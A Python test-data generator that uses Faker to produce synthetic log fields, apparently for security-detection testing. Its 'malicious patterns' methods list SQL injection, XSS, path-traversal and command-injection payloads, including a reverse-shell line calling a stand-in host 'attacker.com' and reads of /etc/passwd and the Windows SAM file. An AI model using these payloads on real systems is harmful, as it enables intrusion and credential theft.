"""Faker configuration for realistic test data generation."""

import random
from typing import List

from faker import Faker


class FakerProvider:
    """Provides realistic fake data for logs."""

    def __init__(self, seed: int = None):
        """Initialize faker with optional seed for reproducibility."""
        self.fake = Faker()
        if seed:
            Faker.seed(seed)
            random.seed(seed)

    # Authentication data
    def username(self) -> str:
        """Generate a realistic username."""
        return self.fake.user_name()

    def email(self) -> str:
        """Generate a realistic email."""
        return self.fake.email()

    def password_attempt(self) -> str:
        """Generate a password (for logging purposes, not actual use)."""
        return self.fake.password(length=12, special_chars=True, digits=True, uppercase=True)

    # Network data
    def ipv4(self) -> str:
        """Generate a realistic IPv4 address."""
        return self.fake.ipv4()

    def ipv4_private(self) -> str:
        """Generate a private IPv4 address."""
        return self.fake.ipv4_private()

    def port(self, well_known: bool = False) -> int:
        """Generate a port number."""
        if well_known:
            return random.choice([22, 80, 443, 3389, 3306, 5432])
        return random.randint(1024, 65535)

    def mac_address(self) -> str:
        """Generate a MAC address."""
        return self.fake.mac_address()

    def hostname(self) -> str:
        """Generate a realistic hostname."""
        return self.fake.hostname()

    def domain_name(self) -> str:
        """Generate a domain name."""
        return self.fake.domain_name()

    def url(self) -> str:
        """Generate a URL."""
        return self.fake.url()

    # System data
    def process_name(self) -> str:
        """Generate a process name."""
        processes = [
            "sshd", "httpd", "mysqld", "postgres", "nginx", "apache2",
            "java", "python3", "bash", "cmd.exe", "powershell.exe",
            "explorer.exe", "rundll32.exe", "chrome.exe", "firefox.exe"
        ]
        return random.choice(processes)

    def process_id(self) -> int:
        """Generate a process ID."""
        return random.randint(100, 9999)

    def user_id(self) -> int:
        """Generate a user ID."""
        return random.randint(0, 65535)

    def group_id(self) -> int:
        """Generate a group ID."""
        return random.randint(0, 65535)

    # Malicious patterns
    def sql_injection_payload(self) -> str:
        """Generate a SQL injection attempt."""
        payloads = [
            "' OR '1'='1",
            "'; DROP TABLE users; --",
            "' UNION SELECT NULL, NULL, NULL --",
            "1' AND '1'='1",
            "admin' --",
        ]
        return random.choice(payloads)

    def xss_payload(self) -> str:
        """Generate an XSS attempt."""
        payloads = [
            "<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
        ]
        return random.choice(payloads)

    def path_traversal_payload(self) -> str:
        """Generate a path traversal attempt."""
        payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
        ]
        return random.choice(payloads)

    def command_injection_payload(self) -> str:
        """Generate a command injection attempt."""
        payloads = [
            "; whoami",
            "| cat /etc/passwd",
            "& systeminfo",
            "; nc -e /bin/sh attacker.com 4444",
        ]
        return random.choice(payloads)

    # HTTP data
    def http_method(self) -> str:
        """Generate an HTTP method."""
        return random.choice(["GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS"])

    def http_status_code(self, success: bool = True) -> int:
        """Generate an HTTP status code."""
        if success:
            return random.choice([200, 201, 204, 304])
        else:
            return random.choice([400, 401, 403, 404, 500, 502, 503])

    def user_agent(self) -> str:
        """Generate a user agent string."""
        return self.fake.user_agent()

    def referer(self) -> str:
        """Generate a referer URL."""
        return self.fake.url()

    # Boolean randomization
    def is_malicious(self, baseline: float = 0.2) -> bool:
        """Decide if event is malicious based on baseline (default 20%)."""
        return random.random() < baseline
